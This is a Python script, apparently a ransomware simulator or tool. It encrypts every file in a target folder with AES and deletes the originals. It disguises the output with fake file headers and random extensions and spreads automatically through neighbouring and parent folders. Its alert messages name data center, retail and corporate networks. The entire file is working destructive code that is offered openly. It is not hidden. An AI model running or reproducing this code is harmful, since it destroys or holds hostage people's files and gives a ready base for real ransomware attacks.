import os
import time
import tkinter as tk
from tkinter import messagebox
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import random

# Fake headers to confuse file type detection
FAKE_HEADERS = {
    'jpg': b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00',
    'png': b'\x89PNG\r\n\x1a\n',
    'gif': b'GIF89a',
    'pdf': b'%PDF-1.4\n%\xE2\xE3\xCF\xD3\n',
    'exe': b'MZP\x00\x02\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00',
    'docx': b'PK\x03\x04\x14\x00\x06\x00',
    'xlsx': b'PK\x03\x04\x14\x00\x06\x00',
    'mp3': b'ID3\x03\x00\x00\x00\x00\x00\x21',
    'mp4': b'\x00\x00\x00\x18ftypmp42',
    'zip': b'PK\x03\x04'
}

FAKE_EXTENSIONS = ['.pdg', '.docx', '.csv', '.txt', '.pdf', '.jpg', '.png']

CHUNK_SIZE = 200 * 1024  # 200 KB
DELAY_PER_CHUNK = 1  # 1 second delay

# Keep track of attacked folders to avoid repeats
attacked_folders = set()

def encrypt_file(filepath, key):
    block_size = AES.block_size
    iv = get_random_bytes(block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    encrypted_data = b''
    with open(filepath, 'rb') as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            padded_chunk = pad(chunk, block_size)
            encrypted_chunk = cipher.encrypt(padded_chunk)
            encrypted_data += encrypted_chunk
            time.sleep(DELAY_PER_CHUNK)

    return iv + encrypted_data

def corrupt_with_fake_header(data):
    header = random.choice(list(FAKE_HEADERS.values()))
    return header + data

def get_random_fake_extension(original_ext):
    choices = [ext for ext in FAKE_EXTENSIONS if ext != original_ext.lower()]
    return random.choice(choices) if choices else '.corrupted'

def attack_file(filepath, key):
    print(f'[+] Attacking file: {filepath}')
    
    try:
        encrypted = encrypt_file(filepath, key)
        corrupted = corrupt_with_fake_header(encrypted)
        base, original_ext = os.path.splitext(filepath)
        fake_ext = get_random_fake_extension(original_ext)
        new_path = base + fake_ext
        
        with open(new_path, 'wb') as f:
            f.write(corrupted)
        
        os.remove(filepath)

        # Rename to .AS extension
        final_path = new_path + '.AS'
        os.rename(new_path, final_path)

        print(f'[✓] File encrypted, corrupted and renamed to: {final_path}')
        return True
    except Exception as e:
        print(f'[!] Failed to process {filepath}: {e}')
        return False

def is_folder_fully_encrypted(folder_path):
    """Check if all files in folder have been encrypted (.AS extension)"""
    has_files = False
    
    for root, _, files in os.walk(folder_path):
        for name in files:
            has_files = True
            # If any file doesn't have .AS extension, folder is not fully encrypted
            if not name.endswith('.AS'):
                return False
    
    # If there are no files at all, consider it "encrypted"
    return has_files or len(os.listdir(folder_path)) == 0

def show_alert(folder_path):
    """Display a pop-up alert about successful encryption"""
    folder_name = os.path.basename(folder_path)
    parent_folder = os.path.basename(os.path.dirname(folder_path))
    
    # Try to identify if this is part of a network structure
    if "data_center" in folder_path:
        network_name = "data center"
    elif "retail" in folder_path.lower():
        network_name = "retail store"
    elif "corporate" in folder_path.lower():
        network_name = "corporate network"
    else:
        network_name = parent_folder
    
    message = f"ALERT: All files in network '{network_name}', folder '{folder_name}' have been successfully encrypted."
    
    try:
        root = tk.Tk()
        root.withdraw()  # Hide the main window
        messagebox.showwarning("Attack Alert", message)
        root.destroy()
    except Exception as e:
        # Fallback if GUI isn't available
        print(f"\n[!] {message}\n")

def get_adjacent_folders(current_folder):
    """Get adjacent folders at the same level as the current folder"""
    parent_dir = os.path.dirname(current_folder)
    
    # Get all subdirectories in the parent directory
    try:
        subdirs = [os.path.join(parent_dir, d) for d in os.listdir(parent_dir) 
                  if os.path.isdir(os.path.join(parent_dir, d))]
    except (PermissionError, FileNotFoundError):
        return []
    
    # Sort them to ensure consistent ordering
    subdirs.sort()
    
    # Find the current folder's index
    try:
        current_index = subdirs.index(current_folder)
    except ValueError:
        return []
    
    # Get the next folder in the sorted list
    if current_index < len(subdirs) - 1:
        return [subdirs[current_index + 1]]
    else:
        # If we're at the last subfolder, we need to move up and find adjacent folders
        return []

def get_next_level_folders(current_folder):
    """When all subfolders at current level are done, find the next parent's sibling"""
    # Get the parent of the current folder
    parent_dir = os.path.dirname(current_folder)
    # Get the parent's parent
    grandparent_dir = os.path.dirname(parent_dir)
    
    # Get all directories in the grandparent
    try:
        parent_siblings = [os.path.join(grandparent_dir, d) for d in os.listdir(grandparent_dir) 
                          if os.path.isdir(os.path.join(grandparent_dir, d))]
    except (PermissionError, FileNotFoundError):
        return []
    
    # Sort them to ensure consistent ordering
    parent_siblings.sort()
    
    # Find the parent directory's index
    try:
        parent_index = parent_siblings.index(parent_dir)
    except ValueError:
        return []
    
    # Get the next parent folder in the sorted list
    if parent_index < len(parent_siblings) - 1:
        next_parent = parent_siblings[parent_index + 1]
        
        # Get the first subfolder in this next parent
        try:
            subfolders = [os.path.join(next_parent, d) for d in os.listdir(next_parent) 
                         if os.path.isdir(os.path.join(next_parent, d))]
            if subfolders:
                subfolders.sort()
                return [subfolders[0]]
        except (PermissionError, FileNotFoundError):
            pass
    
    return []

def attack_folder_and_propagate(folder_path, key):
    """Attack a folder and then propagate to adjacent folders"""
    global attacked_folders
    
    # Skip if already attacked
    if folder_path in attacked_folders:
        print(f"[i] Folder already attacked: {folder_path}")
        return
    
    print(f"\n[+] Attacking folder: {folder_path}")
    attacked_folders.add(folder_path)
    
    # Attack all files in the current folder
    attack_success = True
    for root, _, files in os.walk(folder_path):
        for name in files:
            # Skip already encrypted files
            if name.endswith('.AS'):
                continue
                
            filepath = os.path.join(root, name)
            result = attack_file(filepath, key)
            if not result:
                attack_success = False
                print(f"[!] Attack failed on file: {filepath}")
                return
    
    # Check if attack was successful
    if attack_success and is_folder_fully_encrypted(folder_path):
        show_alert(folder_path)
        print(f"[✓] Successfully attacked {folder_path}")
        
        # Find and attack adjacent subfolders
        next_folder = get_adjacent_folders(folder_path)
        
        if next_folder:
            # Attack the next adjacent folder at the same level
            attack_folder_and_propagate(next_folder[0], key)
        else:
            # If no more folders at this level, try to find folders at the next level
            next_level_folder = get_next_level_folders(folder_path)
            if next_level_folder:
                attack_folder_and_propagate(next_level_folder[0], key)
            else:
                print(f"[✓] No more adjacent folders to attack from {folder_path}")
    else:
        print(f"[!] Attack on {folder_path} was incomplete or failed. Stopping propagation.")

def attack_directory_recursive(root_dir):
    """Start the attack at the given directory and propagate through the folder structure"""
    key = get_random_bytes(16)
    print(f"\n[!] AES Key (store safely for decryption): {key.hex()}\n")
    
    # Start with the first subfolder if available
    try:
        subfolders = [os.path.join(root_dir, d) for d in os.listdir(root_dir) 
                     if os.path.isdir(os.path.join(root_dir, d))]
        if subfolders:
            subfolders.sort()
            start_folder = subfolders[0]
            attack_folder_and_propagate(start_folder, key)
        else:
            # If no subfolders, attack the root directory itself
            attack_folder_and_propagate(root_dir, key)
    except Exception as e:
        print(f"[!] Error starting attack: {e}")

if __name__ == '__main__':
    target_directory = input("Enter the full path to the folder you want to attack: ").strip()
    if not os.path.isdir(target_directory):
        print(f"[✘] Invalid directory: {target_directory}")
    else:
        attack_directory_recursive(target_directory)